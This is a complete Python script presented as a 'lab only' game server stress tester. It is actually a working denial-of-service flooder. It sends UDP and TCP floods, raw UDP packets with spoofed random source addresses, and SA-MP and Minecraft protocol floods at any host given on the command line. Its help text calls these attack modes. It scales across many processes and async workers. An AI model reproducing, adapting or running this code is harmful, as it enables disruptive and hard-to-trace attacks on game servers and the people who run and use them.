#!/usr/bin/env python3
"""
Universal Game Server Stress Tester v2 (Laboratory Use Only)
Supports modes: udp, tcp, udp-spoof, samp, mc, combo
"""

import argparse
import asyncio
import multiprocessing
import threading
import socket
import struct
import random
import time
import os
import psutil

# —— Helpers ——

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def build_udp_packet(src: str, dst: str, dport: int, size: int) -> bytes:
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
        (4 << 4) | 5, 0, 20 + 8 + size, random.randint(0, 65535),
        0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst)
    )
    udp_hdr = struct.pack('!HHHH',
        random.randint(1024, 65535), dport, 8 + size, 0
    )
    return ip_hdr + udp_hdr + os.urandom(size)


def encode_varint(v: int) -> bytes:
    b = b''
    while True:
        temp = v & 0x7F
        v >>= 7
        if v:
            temp |= 0x80
        b += struct.pack('B', temp)
        if not v:
            break
    return b


def make_mc(host: str, port: int) -> bytes:
    hs = (
        encode_varint(754)
        + encode_varint(len(host)) + host.encode()
        + struct.pack('>H', port)
        + encode_varint(1)
    )
    return encode_varint(len(hs) + 1) + b'\x00' + hs + b'\x01\x00'


def make_samp(host: str, port: int) -> bytes:
    return b'SAMP' + socket.inet_aton(host) + struct.pack('>H', port) + b'i'

# —— Async routines ——

async def tcp_flood_once(host: str, port: int, pkt_size: int, delay: float):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=2
        )
        writer.write(os.urandom(pkt_size))
        await writer.drain()
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass
    await asyncio.sleep(delay)

async def udp_flood_once(host: str, port: int, pkt_size: int, delay: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(os.urandom(pkt_size), (host, port))
    sock.close()
    await asyncio.sleep(delay)

async def udp_spoof_once(host: str, port: int, pkt_size: int, delay: float):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print("[!] Permission denied: raw socket requires root privileges.")
        return
    pkt = build_udp_packet(random_ip(), host, port, pkt_size)
    sock.sendto(pkt, (host, port))
    sock.close()
    await asyncio.sleep(delay)

async def samp_once(host: str, port: int, _pkt_size: int, delay: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(make_samp(host, port), (host, port))
    sock.close()
    await asyncio.sleep(delay)

async def mc_once(host: str, port: int, _pkt_size: int, delay: float):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=2
        )
        writer.write(make_mc(host, port))
        await writer.drain()
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass
    await asyncio.sleep(delay)

async def worker(mode_func, host, port, pkt_size, delay, stop_time, stats):
    while time.time() < stop_time:
        await mode_func(host, port, pkt_size, delay)
        stats['sent'] += 1

# —— Live stats printer ——

def stats_printer(mode: str, stats: dict, interval: float = 1.0):
    prev = 0
    while not stats.get('done', False):
        time.sleep(interval)
        sent = stats['sent'] - prev
        prev = stats['sent']
        cpu = psutil.cpu_percent(interval=None)
        print(f"[{mode.upper()}] {sent} pkt/s — Total: {stats['sent']} — CPU: {cpu}%")

# —— Process launcher ——

def run_process(args, mode: str, mode_func):
    stats = {'sent': 0, 'done': False}
    stop_time = time.time() + args.duration
    # start stats thread
    t_stats = threading.Thread(target=stats_printer, args=(mode, stats), daemon=True)
    t_stats.start()

    async def main_loop():
        tasks = [
            worker(
                mode_func,
                args.host,
                args.port,
                random.randint(args.min_pkt, args.max_pkt),
                args.delay + random.uniform(-args.jitter, args.jitter),
                stop_time,
                stats
            )
            for _ in range(args.concurrency)
        ]
        await asyncio.gather(*tasks)
        stats['done'] = True

    asyncio.run(main_loop())
    t_stats.join()

# —— CLI entry point ——

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal Stress Tester v2 (Lab Only)")
    parser.add_argument("mode", choices=['udp', 'tcp', 'udp-spoof', 'samp', 'mc', 'combo'],
                        help="Attack mode")
    parser.add_argument("host", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=25565, help="Target port")
    parser.add_argument("--min-pkt", type=int, default=512, help="Min packet size (bytes)")
    parser.add_argument("--max-pkt", type=int, default=2048, help="Max packet size (bytes)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--delay", type=float, default=0.01, help="Base delay between sends")
    parser.add_argument("--jitter", type=float, default=0.005, help="± jitter for delay")
    parser.add_argument("-c", "--concurrency", type=int,
                        default=multiprocessing.cpu_count() * 50,
                        help="Async workers per process")
    parser.add_argument("-P", "--processes", type=int,
                        default=multiprocessing.cpu_count(),
                        help="Number of processes to spawn")
    args = parser.parse_args()

    funcs = {
        'udp': udp_flood_once,
        'tcp': tcp_flood_once,
        'udp-spoof': udp_spoof_once,
        'samp': samp_once,
        'mc': mc_once
    }

    modes = [args.mode] if args.mode != 'combo' else ['udp', 'tcp', 'samp', 'mc']
    procs = []
    for mode in modes:
        mode_func = funcs.get(mode)
        if not mode_func:
            continue
        print(f"[+] Mode: {mode} | Concurrency: {args.concurrency} | Processes: {args.processes}")
        for _ in range(args.processes):
            p = multiprocessing.Process(target=run_process, args=(args, mode, mode_func))
            p.start()
            procs.append(p)
    for p in procs:
        p.join()

    print("[+] Attack finished.")
